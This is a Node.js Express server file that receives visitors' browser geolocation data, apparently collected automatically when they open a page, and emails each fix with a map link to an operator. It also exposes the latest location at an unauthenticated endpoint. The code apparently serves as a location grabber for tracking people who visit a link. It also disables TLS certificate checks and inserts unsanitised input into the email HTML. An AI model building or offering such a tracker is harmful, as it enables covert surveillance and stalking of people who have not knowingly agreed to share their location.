// server.js
const express = require('express');
const cors = require('cors');
const path = require('path');
const nodemailer = require('nodemailer');
require('dotenv').config();

// Handle fetch for Node.js versions
let fetch;
try {
    fetch = globalThis.fetch || require('node-fetch');
} catch {
    fetch = globalThis.fetch;
}

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Store latest location
let latestLocation = null;
let locationHistory = [];

// Email Configuration
const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
    },
    tls: {
        rejectUnauthorized: false
    }
});

transporter.verify((error) => {
    if (error) {
        console.error('❌ Email error:', error.message);
    } else {
        console.log('✅ Email server ready!');
        console.log(`📧 From: ${process.env.EMAIL_USER}`);
        console.log(`📧 To: ${process.env.EMAIL_TO}`);
    }
});

// Routes
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/api/latest-location', (req, res) => {
    res.json({
        success: !!latestLocation,
        data: latestLocation || null
    });
});

app.get('/test-email', async (req, res) => {
    try {
        await transporter.sendMail({
            from: process.env.EMAIL_USER,
            to: process.env.EMAIL_TO,
            subject: '✅ Test Email',
            text: 'Email configuration working!'
        });
        res.json({ success: true, message: 'Test email sent!' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Track location endpoint
app.post('/api/track-location', async (req, res) => {
    try {
        const { 
            latitude, longitude, accuracy, altitude,
            speed, heading, source, userAgent, autoFetched 
        } = req.body;

        console.log(`📍 Location: ${latitude}, ${longitude}`);
        console.log(`🎯 Accuracy: ${accuracy}m`);
        console.log(`🔄 Auto-fetched: ${autoFetched ? 'Yes' : 'No'}`);

        const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
        const timestamp = new Date().toLocaleString();

        const locationData = {
            latitude,
            longitude,
            accuracy,
            altitude,
            speed,
            heading,
            source: source || 'GPS',
            autoFetched: autoFetched || false,
            timestamp: new Date().toISOString(),
            mapsLink
        };
        
        latestLocation = locationData;
        locationHistory.push({ ...locationData, capturedAt: new Date().toISOString() });

        // Email HTML
        const emailHtml = `
            <!DOCTYPE html>
            <html>
            <head>
                <style>
                    body { font-family: Arial; max-width: 600px; margin: 0 auto; padding: 20px; background: #f4f4f4; }
                    .container { background: white; border-radius: 10px; padding: 30px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                    .header { background: linear-gradient(135deg, #28a745 0%, #20c997 100%); color: white; padding: 20px; border-radius: 10px 10px 0 0; margin: -30px -30px 20px -30px; }
                    .header h1 { margin: 0; }
                    .badge { display: inline-block; background: #ffc107; color: #856404; padding: 4px 12px; border-radius: 12px; font-size: 12px; margin-top: 5px; }
                    .auto-badge { display: inline-block; background: #17a2b8; color: white; padding: 4px 12px; border-radius: 12px; font-size: 12px; margin-left: 5px; }
                    .info { background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0; }
                    .info-row { display: flex; justify-content: space-between; padding: 10px; border-bottom: 1px solid #e9ecef; }
                    .info-row:last-child { border-bottom: none; }
                    .label { font-weight: bold; color: #495057; }
                    .value { color: #212529; }
                    .map-link { display: inline-block; background: #007bff; color: white; padding: 12px 25px; text-decoration: none; border-radius: 5px; margin: 10px 0; }
                    .footer { margin-top: 30px; text-align: center; color: #6c757d; font-size: 12px; border-top: 1px solid #dee2e6; padding-top: 20px; }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="header">
                        <h1>📍 Device Location</h1>
                        <p>User visited on ${timestamp}</p>
                        <span class="badge">📡 ${source || 'GPS'}</span>
                        ${autoFetched ? '<span class="auto-badge">🔄 Auto-Fetched</span>' : ''}
                    </div>
                    <div class="info">
                        <div class="info-row"><span class="label">📅 Time:</span><span class="value">${timestamp}</span></div>
                        <div class="info-row"><span class="label">📍 Latitude:</span><span class="value">${latitude}</span></div>
                        <div class="info-row"><span class="label">📍 Longitude:</span><span class="value">${longitude}</span></div>
                        <div class="info-row"><span class="label">🎯 Accuracy:</span><span class="value">${accuracy}m</span></div>
                        ${altitude ? `<div class="info-row"><span class="label">⛰️ Altitude:</span><span class="value">${altitude}m</span></div>` : ''}
                        ${speed ? `<div class="info-row"><span class="label">🏃 Speed:</span><span class="value">${speed} m/s</span></div>` : ''}
                        ${heading ? `<div class="info-row"><span class="label">🧭 Heading:</span><span class="value">${heading}°</span></div>` : ''}
                    </div>
                    <div style="text-align: center;">
                        <a href="${mapsLink}" target="_blank" class="map-link">🗺️ View on Google Maps</a>
                    </div>
                    <div class="footer">
                        <p>📍 Location captured ${autoFetched ? 'automatically' : 'manually'}</p>
                    </div>
                </div>
            </body>
            </html>
        `;

        await transporter.sendMail({
            from: process.env.EMAIL_USER,
            to: process.env.EMAIL_TO,
            subject: `📍 ${autoFetched ? 'Auto' : 'Manual'} Location - ${timestamp}`,
            html: emailHtml,
            text: `Location: ${latitude}, ${longitude}\nAccuracy: ${accuracy}m\nMaps: ${mapsLink}`
        });

        console.log(`✅ Email sent to ${process.env.EMAIL_TO}`);

        res.json({ success: true, message: 'Location tracked!' });

    } catch (error) {
        console.error('❌ Error:', error);
        res.status(500).json({ success: false, message: error.message });
    }
});

app.listen(PORT, () => {
    console.log(`\n🚀 Server running on http://localhost:${PORT}`);
    console.log(`📧 Test email: http://localhost:${PORT}/test-email`);
    console.log(`📍 Location tracker: http://localhost:${PORT}/\n`);
});